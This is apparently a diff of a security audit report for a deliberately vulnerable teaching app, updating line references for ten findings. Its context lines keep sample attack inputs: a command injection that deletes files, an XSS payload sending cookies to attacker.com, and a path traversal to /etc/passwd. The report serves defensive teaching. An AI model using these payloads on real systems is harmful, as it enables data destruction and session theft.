@@ -31,7 +31,7 @@ All findings have been remediated in the secure version (`secure_app.py`).
 
 ### Finding #1 — Hardcoded Database Password (Critical)
 
-**Location:** `vulnerable_app.py:26`
+**Location:** `vulnerable_app.py:29`
 
 ```
 DB_PASSWORD = "SuperSecret123!"
@@ -49,13 +49,13 @@ database directly, potentially leaking or modifying all data.
 - Use a `.env` file (excluded from version control via `.gitignore`)
 - Restrict database access by IP and principle of least privilege
 
-**Fixed in:** `secure_app.py:15` — reads `DB_PATH` from environment variable
+**Fixed in:** `secure_app.py:20` — reads `DB_PATH` from environment variable
 
 ---
 
 ### Finding #2 — SQL Injection (Critical)
 
-**Location:** `vulnerable_app.py:34`
+**Location:** `vulnerable_app.py:40`
 
 ```python
 query = "SELECT * FROM accounts WHERE username = '" + username + "'"
@@ -80,13 +80,13 @@ Result: Returns all rows in the accounts table
 - Never concatenate user input into SQL strings
 - Use an ORM (Object-Relational Mapper) like SQLAlchemy
 
-**Fixed in:** `secure_app.py:25` — uses parameterized query with `?` placeholder
+**Fixed in:** `secure_app.py:31` — uses parameterized query with `?` placeholder
 
 ---
 
 ### Finding #3 — Command Injection (Critical)
 
-**Location:** `vulnerable_app.py:41`
+**Location:** `vulnerable_app.py:49`
 
 ```python
 result = subprocess.check_output("ping -n 1 " + ip_address, shell=True)
@@ -109,13 +109,13 @@ Executed: ping -n 1 8.8.8.8 & del /f /q *.*
 - Validate and sanitize input (e.g., IP address format validation)
 - Use a dedicated library instead of shell commands when possible
 
-**Fixed in:** `secure_app.py:44` — uses list arguments and validates IP address format
+**Fixed in:** `secure_app.py:50` — uses list arguments and validates IP address format
 
 ---
 
 ### Finding #4 — Path Traversal (High)
 
-**Location:** `vulnerable_app.py:48`
+**Location:** `vulnerable_app.py:56`
 
 ```python
 def read_user_file(filename):
@@ -142,13 +142,13 @@ Result: Contents of /etc/passwd
 - Block `..` and absolute path sequences
 - Use a whitelist of allowed filenames
 
-**Fixed in:** `secure_app.py:63` — validates the resolved path is within the base directory
+**Fixed in:** `secure_app.py:68` — validates the resolved path is within the base directory
 
 ---
 
 ### Finding #5 — Cross-Site Scripting (XSS) (High)
 
-**Location:** `vulnerable_app.py:55-58`
+**Location:** `vulnerable_app.py:63-67`
 
 ```python
 def display_profile(username):
@@ -172,13 +172,13 @@ Input: <script>document.location='https://attacker.com/steal.php?cookie='+docume
 - Use `html.escape()` in Python or a templating engine (Jinja2, Django templates)
 - Apply Content Security Policy (CSP) headers
 
-**Fixed in:** `secure_app.py:81` — uses `html.escape()` to sanitize output
+**Fixed in:** `secure_app.py:86` — uses `html.escape()` to sanitize output
 
 ---
 
 ### Finding #6 — Weak Password Storage (High)
 
-**Location:** `vulnerable_app.py:65-67`
+**Location:** `vulnerable_app.py:72-75`
 
 ```python
 users_db = {}
@@ -199,13 +199,13 @@ amplifying the impact.
 - Always use a unique, random salt per password
 - Example: `hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)`
 
-**Fixed in:** `secure_app.py:96` — uses PBKDF2 with a random salt
+**Fixed in:** `secure_app.py:101` — uses PBKDF2 with a random salt
 
 ---
 
 ### Finding #7 — Insecure Use of eval() (Critical)
 
-**Location:** `vulnerable_app.py:73`
+**Location:** `vulnerable_app.py:85-86`
 
 ```python
 def calculate(expression):
@@ -227,15 +227,15 @@ Result: Eval executes the system command directly
 **Remediation:**
 - Never use `eval()` with untrusted input
 - Use `ast.literal_eval()` for safe evaluation of literal expressions
-- If you need a calculator, parse the expression manually with a math parser
+- If you need a calculator, parse the expression manually with a math parser using `ast.parse()` and a whitelist of allowed operators
 
-**Fixed in:** `secure_app.py:114` — uses `ast.literal_eval()` instead
+**Fixed in:** `secure_app.py:130` — uses safe AST-based expression evaluator instead of `eval()`
 
 ---
 
 ### Finding #8 — Predictable Session Tokens (Medium)
 
-**Location:** `vulnerable_app.py:79-83`
+**Location:** `vulnerable_app.py:91-97`
 
 ```python
 session_counter = 0
@@ -258,13 +258,13 @@ hijack their session.
 - Use Python's `secrets.token_hex(32)` or `secrets.token_urlsafe(32)`
 - Set proper session expiration and rotation
 
-**Fixed in:** `secure_app.py:129` — uses `secrets.token_hex(32)` for unpredictable tokens
+**Fixed in:** `secure_app.py:155` — uses `secrets.token_hex(32)` for unpredictable tokens
 
 ---
 
 ### Finding #9 — Information Disclosure via Stack Traces (Medium)
 
-**Location:** `vulnerable_app.py:91-92`
+**Location:** `vulnerable_app.py:109-112`
 
 ```python
 except Exception as e:
@@ -283,13 +283,13 @@ versions, and other implementation details.
 - Show generic error messages to users
 - Use a proper logging framework with different levels (DEBUG, INFO, ERROR)
 
-**Fixed in:** `secure_app.py:138` — logs the error and shows a generic message to the user
+**Fixed in:** `secure_app.py:163` — logs the error and shows a generic message to the user
 
 ---
 
 ### Finding #10 — Dangerous Function (input() in Python 2) (Low)
 
-**Location:** `vulnerable_app.py:97-100`
+**Location:** `vulnerable_app.py:117-119`
 
 ```python
 def get_user_input():
@@ -309,7 +309,7 @@ always check which Python version you are using.
 - If using Python 2, always use `raw_input()` instead of `input()`
 - Add input validation regardless
 
-**Fixed in:** `secure_app.py:147` — adds input validation for safe options
+**Fixed in:** `secure_app.py:173` — adds input validation for safe options
 
 ---
 
